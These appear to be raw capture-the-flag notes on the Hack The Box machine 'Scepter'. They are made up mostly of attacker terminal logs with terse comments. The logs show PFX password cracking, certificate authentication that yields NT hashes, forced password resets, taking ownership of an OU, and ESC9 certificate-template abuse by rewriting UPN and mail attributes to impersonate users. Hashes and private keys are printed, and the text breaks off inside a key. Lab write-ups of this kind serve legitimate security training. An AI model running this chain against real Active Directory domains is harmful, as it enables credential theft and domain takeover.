
```C
[Apr 20, 2025 - 10:53:49 (+03)] exegol-htb /workspace # nmap -sC -sV -Pn -T4 10.129.81.110
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-20 10:54 +03
Nmap scan report for 10.129.81.110
Host is up (0.069s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 15:55:41Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)                                                                                                                                                                   | rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs                                                                                                                                                                           |   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                                                                      |   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status                                                                                                                                                                        135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T15:56:37+00:00; +8h01m19s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T15:56:37+00:00; +8h01m20s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)                                                                                      |_ssl-date: 2025-04-20T15:56:37+00:00; +8h01m19s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)                                                                                      |_ssl-date: 2025-04-20T15:56:37+00:00; +8h01m20s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb                                                                                                                 | Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h01m19s, deviation: 0s, median: 8h01m19s
| smb2-time:
|   date: 2025-04-20T15:56:27
|_  start_date: N/A                                                                                                                                                                                              | smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.61 seconds

```




```
[Apr 20, 2025 - 10:59:25 (+03)] exegol-htb wtf # ls
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
```


```
[Apr 20, 2025 - 11:02:20 (+03)] exegol-htb wtf # pfx2john.py
Usage: /opt/tools/john/run/pfx2john.py <.pfx file(s)>
```


```
[Apr 20, 2025 - 11:02:21 (+03)] exegol-htb wtf # pfx2john.py  lewis.pfx                                                                                                                                          lewis.pfx:$pfxng$256$32$2048$8$2ae[...]da17:::::lewis.pfx                                                                                                
```



```python
[Apr 20, 2025 - 11:02:31 (+03)] exegol-htb wtf ~ john lewis.hash
Using default input encoding: UTF-8                                                                                                   Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])  Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 16 [worst case UTF-8] to 48 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-04-20 11:02) 0g/s 26864p/s 26864c/s 26864C/s Lewis.pfxpfx1902..Plewis1900
Proceeding with wordlist:/opt/tools/john/run/password.lst
Enabling duplicate candidate password suppressor
newpassword      (lewis.pfx)  <-------------------------
1g 0:00:00:00 DONE 2/3 (2025-04-20 11:02) 1.111g/s 26060p/s 26060c/s 26060C/s amazing1..sousou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```



so now we have established that we have found the password that is used to encrypt these files right? what if we could create a pfx out of the cert and key files? lets try that


```
[Apr 20, 2025 - 11:10:19 (+03)] exegol-htb wtf # certipy auth -pfx "baker.pfx" -dc-ip '10.129.81.110' -username 'baker' -domain 'scepter.htb0'
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                                                                                           
[-] Got error: Invalid password or PKCS12 data
[-] Use -debug to print a stacktrace
```


```
[Apr 20, 2025 - 11:10:27 (+03)] exegol-htb wtf # cat baker.key
Bag Attributes                                                                                                                                                                                                       friendlyName:
    localKeyID: DC 2B 20 65 C3 0D 91 40 E8 37 B5 CC 06 0F EA 66 5D 3B 7C 4E
Key Attributes: <No Attributes>
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQ17OfpdLR0GFTqV4d
KoDehgICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEEcu2qznlHlXQqAg                                                                                                                                                 xOEmzdQEggTQHj6+lbqr5wQXN8Oqxe57h5vuA8ihIcIte/gpDRNnIzvLDvmQ3gSr
JE51d0E4VhzxcSYH43m3X64GQ8mkESOuoKh5JhwX5+vWHvbKM18komfpX4MHhe0J
wblo8Dhc3j2BSuhRoYpG9mJwSdATYFwxlYnWF5499bDHGkPnOPkR08C/FRyW1QhJ                                                                                                                                                 qyMGNLnJ9IxlWySY+Fm/0RQOyu4hS0u87OLoglW9OIhDfu6rz0QdDWIs+1dQxrwE
a6OBdL+q38NSK6H2cBopCYTtyGw/Okzl5+Lrn411a2HdpT8JjXinTNZMtn9hww6U
MqqMUYzXG6zfBQ/vSoutIW0/Wkg5b4BVK/wW/EFh6vcBlWVk0CdXz8kScsWx7KF4
4yqKTN/aWGfvYx2DWW17cGzUsOvAmW1OXgu2YBYVAjs6vbXYzJyqzTKIlsSKmnP+                                                                                                                                                 wzaoxgAsT/QtEAHppMDIW0jEDpYDcRvRi5//Ejpdbz3XETvEXFj1OEpWVwWTxZSM
tiEjCRJU/btiRsXoB1p1mvHEA1RyO+XX93yX5WRbFUB+5t9t8XrVCsUt1JfFNdVa
mC4BhzAInFgut74NiIQ7vbe3OlNsse0ZWtfwof4mzb4U1e7dCffD0IoKXLxZhszd
Cave8eNaHYi6N7wO5ActNp5HhQFhtogTSe99NHnE41zRHTcejsFsUQS/mpzubUXj
aGkTt5uPRJXuw5+jcxpZOvXKb6qDdJUSCa/Od4fGgmQGtaKBr/XIciQg/K96CBUH
ayp6WcBcAwtTZeUQJM/V/qheHtipsJjuJzeBi35IitpafblcrKMSmtIKE972b5fD
X0NdnDCSrNZeTXNYC4BN2+t4h1QP1heWU2jfzNLAcDoD+aUrpW/JCEGwMzOe6MTC
c/h3NCYOcPvcc3L20wXOtYOjp6gzDdp2JliW+n6QUxm7fJo/AUtGGSknziZ3VbMc
fqC4vbPy88d2fHt9QWmIOmjpMpwZObotA8rMpg41FxsXQq9mqZy08tppF6T0DdwY
A8soic4SbMpUAuuAz9WJRwKtHwlGoJNtBrLfrVKsUnO/FGZpDOYyIRCBMlMyI6u2
LPLVkRIJx+tajQhkzhfTmdx6CQUmeaJU2wL92fY1jqTeRcm2T70TVHKZk2spcaGp
lVcRgWdFAz52JHNCfVjCfJ6dRbVPxbSC2vHN/YJa8LcQA0RGgKxoh1sRC/3HHFQz
wtJ/xnp/dk4YsntrUOgr8/mcjYqQh7WqRzHFYG/VE2Ipy3XT6iONi23ggiAWP9KV
e0cRcPSwjN4FzQH+fX3rf1x8YcQI9UricqxI2IM3Q9dDkZhMz4yjStO2XGpOo5od
AiOTySb9tflvKZOggXKZE1Eo7lHpWYfKt7baQlUEFb2RslA0JjBtJ8fdJqdHW1+8
3o8QN4AJtYqNDB6dHaxMmwG7L1WnCMofbGDxlK+bdsgr3BapXt0n6+JXA6iS7i8J
wYTlDp5UYXTT87fUGejNBXhCsJODZJGQxVjxl5JMhmaLbvFNW0YDAZe8WnX7LsYp
7X+ajbc3hOSIIU1JOufrGWQxVvkoFdXcRBG9L15Uwsrpfzr2CA5J3kRMBxuZQnjJ
90yWTwKFUUj3pzCG2WyraNJn44jo3sFJzoUhyUKUYfn2lMtnwOvw//A=
-----END ENCRYPTED PRIVATE KEY-----
```


why is it already encrypted? lets try again


```
[Apr 20, 2025 - 11:10:37 (+03)] exegol-htb wtf # openssl pkcs12 -export \
  -inkey baker.key \
  -in baker.crt \
  -out baker.pfx

Enter pass phrase for baker.key:
Enter Export Password:
Verifying - Enter Export Password:
[Apr 20, 2025 - 11:11:04 (+03)] exegol-htb wtf # ls
baker.crt  baker.key  baker.pfx  clark.pfx  lewis.hash  lewis.pfx  scott.pfx
```




```
[Apr 20, 2025 - 11:11:20 (+03)] exegol-htb wtf # certipy auth -pfx "baker.pfx" -dc-ip '10.129.81.110' -username 'baker' -domain 'scepter.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] The provided username does not match the identification found in the provided certificate: 'BAKER' - 'd.baker'
Do you want to continue? (Y/n) Y
[*] Using principal: baker@scepter.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```


```
[Apr 20, 2025 - 11:15:16 (+03)] exegol-htb wtf # faketime "$(rdate -n 10.129.81.110 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
[Apr 20, 2025 - 19:17:26 (+03)] exegol-htb wtf # certipy auth -pfx "baker.pfx" -dc-ip '10.129.81.110' -username 'd.baker' -domain 'scepter.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```


certipy doesnt take pfx with password so it needs to be no password, apparently bloodyAD doesnt recognize forcechangepassword as its father and proceeded to abondon it, baller ?


```

```



h.brown has psremote
p.adams 



![[Scepter-20250420113945353.webp]]



```
  1
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension

```


```
[Apr 20, 2025 - 11:57:36 (+03)] exegol-htb /workspace # bloodyAD --host "10.129.81.110" -d scepter.htb -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' set password 'a.carter' 'FuckYou123!'
[+] Password changed successfully!

```


```
[Apr 20, 2025 - 12:52:54 (+03)] exegol-htb /workspace # bloodyAD --host "10.129.81.110" -d scepter.htb -u a.carter -p 'FuckYou123!' set owner 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'a.carter'
[+] Old owner S-1-5-21-74879546-916818434-740295365-512 is now replaced by a.carter on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

```
[Apr 20, 2025 - 12:53:04 (+03)] exegol-htb /workspace # bloodyAD --host "10.129.81.110" -d scepter.htb -u a.carter -p 'FuckYou123!' add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'a.carter'
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

```
certipy account update -username "a.carter@scepter.htb" -p 'FuckYou123!' -user d.baker -upn administrator
```

```
certipy req -username "d.backer@scepter.htb" -hashes "aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" -target "10.129.81.110" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
```

```
certipy account update -username "a.carter@scepter.htb" -p 'FuckYou123!' -user d.baker -upn "d.baker@scepter.htb"
```


```
certipy find -enabled -u "d.baker@scepter.htb" -hashes "18b5fb0d99e7a475316213c15b6f22ce" -stdout -debug
```


```
x509rfc822
```


```
[Apr 20, 2025 - 13:42:34 (+03)] exegol-htb /workspace # nxc ldap 10.129.81.110 -u 'd.baker' -H '18b5fb0d99e7a475316213c15b6f22ce' -M maq
LDAP        10.129.81.110   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.129.81.110   389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce
MAQ         10.129.81.110   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.81.110   389    DC01             MachineAccountQuota: 0
```


```
[Apr 20, 2025 - 14:17:17 (+03)] exegol-htb /workspace # bloodyAD --host "10.129.81.110" -d scepter.htb -u a.carter -p 'FuckYou123!' set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```




```
[Apr 20, 2025 - 14:18:02 (+03)] exegol-htb /workspace # certipy req -username "d.baker@scepter.htb" -hashes ":18b5fb0d99e7a475316213c15b6f22ce" -target "10.129.81.110" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'SCEPTER.HTB' at '192.168.65.7'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.81.110[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.81.110[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
```




```
[Apr 20, 2025 - 22:24:25 (+03)] exegol-htb /workspace # certipy auth -pfx "d.baker.pfx" -dc-ip '10.129.81.110' -username 'h.brown' -domain 'scepter.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```


if we try to authenticate it wont work because the encryption type is not supported

```
[Apr 20, 2025 - 22:29:06 (+03)] exegol-htb /workspace # nxc smb 10.129.81.110 -u 'h.brown' -H '4ecf5242092c6fb8c360a08069c75a0c'
SMB         10.129.81.110   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.129.81.110   445    DC01             [-] scepter.htb\h.brown:4ecf5242092c6fb8c360a08069c75a0c STATUS_ACCOUNT_RESTRICTION
[Apr 20, 2025 - 22:29:55 (+03)] exegol-htb /workspace # nxc smb 10.129.81.110 -u 'h.brown' -H '4ecf5242092c6fb8c360a08069c75a0c' -k
SMB         10.129.81.110   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.129.81.110   445    DC01             [-] scepter.htb\h.brown:4ecf5242092c6fb8c360a08069c75a0c KDC_ERR_ETYPE_NOSUPP
```


```
## **2. KRB_AS_REP**

The authentication server looks up the client and server principals named in the KRB_AS_REQ in its database, extracting their respective keys. If required, the server pre-authenticates the request, and if the pre-authentication check fails, an error message with the code KDC_ERR_PREAUTH_FAILED is returned. If the server cannot accommodate the requested encryption type, an error message with code KDC_ERR_ETYPE_NOSUPP is returned. Otherwise it it must respond with a KRB_AS_REP contained 2 parts:
```

https://www.chudamax.com/posts/kerberos-102-overview/



```
[Apr 20, 2025 - 23:25:07 (+03)] exegol-htb /workspace # bloodyAD --host "dc01.scepter.htb" -d scepter.htb -u h.brown -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb
permission: WRITE

distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb
permission: WRITE

distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
permission: WRITE
```


```
(LDAPS)-[dc01.scepter.htb]-[SCEPTER\d.baker]
PV > Get-DomainUser -Identity p.adams -Properties *
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : p.adams
givenName                         : p.adams
distinguishedName                 : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
instanceType                      : 4
whenCreated                       : 31/10/2024 23:13:33 (5 months, 19 days ago)
whenChanged                       : 02/11/2024 22:07:24 (5 months, 17 days ago)
displayName                       : p.adams
uSNCreated                        : 16519
memberOf                          : CN=Replication Operators,CN=Users,DC=scepter,DC=htb
uSNChanged                        : 77892
name                              : p.adams
objectGUID                        : {a7ce1414-7b8e-41b7-9725-3686e4ed80a7}
userAccountControl                : NORMAL_ACCOUNT [66048]
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
codePage                          : 0
countryCode                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 3 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 01/11/2024 04:01:01 (5 months, 19 days ago)
logonHours                        : ////////////////////////////
pwdLastSet                        : 02/11/2024 08:00:25 (5 months, 18 days ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-74879546-916818434-740295365-1109
accountExpires                    : 1601-01-01 00:00:00+00:00
logonCount                        : 1
sAMAccountName                    : p.adams
sAMAccountType                    : SAM_USER_OBJECT
userPrincipalName                 : p.adams@scepter.htb
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=scepter,DC=htb
dSCorePropagationData             : 11/02/2024
                                    11/02/2024
                                    11/02/2024
                                    11/02/2024
                                    01/01/1601
lastLogonTimestamp                : 01/11/2024 04:01:01 (5 months, 19 days ago)
```


```
[Apr 20, 2025 - 23:26:48 (+03)] exegol-htb /workspace # bloodyAD --host "dc01.scepter.htb" -d scepter.htb -u h.brown -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```


fucking kill me now


```
[Apr 20, 2025 - 15:48:14 (+03)] exegol-htb /workspace # certipy find -enabled -u "d.baker@scepter.htb" -hashes "aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" -stdout -debug | egrep -A4 -ie'template name|enrollment rights'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

    Template Name                       : HelpdeskEnrollmentCertificate
    Display Name                        : HelpdeskEnrollmentCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Computers
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Administrator
--
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
--
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Enterprise Read-only Domain Controllers
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Controllers
                                          SCEPTER.HTB\Enterprise Admins
                                          SCEPTER.HTB\Enterprise Domain Controllers
--
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : False
--
        Enrollment Rights               : SCEPTER.HTB\Enterprise Read-only Domain Controllers
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Controllers
                                          SCEPTER.HTB\Enterprise Admins
                                          SCEPTER.HTB\Enterprise Domain Controllers
--
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Enterprise Read-only Domain Controllers
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Controllers
                                          SCEPTER.HTB\Enterprise Admins
                                          SCEPTER.HTB\Enterprise Domain Controllers
--
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
--
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : False
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
--
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Enterprise Read-only Domain Controllers
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Controllers
                                          SCEPTER.HTB\Enterprise Admins
                                          SCEPTER.HTB\Enterprise Domain Controllers
--
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Computers
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
--
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : False
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
--
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
--
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : False
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Users
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
--
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
--
        Enrollment Rights               : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Domain Users
                                          SCEPTER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
[Apr 20, 2025 - 15:48:39 (+03)] exegol-htb /workspace #

```



```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwk0WwhnFt5H/ZS+HJjBuLEq/WsLXdEJpRAYD/G7T94cHukpj
SnOWtueGP/AJBqTCQRmwo4MXawzzOhv0ci4ZojZmTQKpUGDNu8zVWNrLsBRFZZ5K
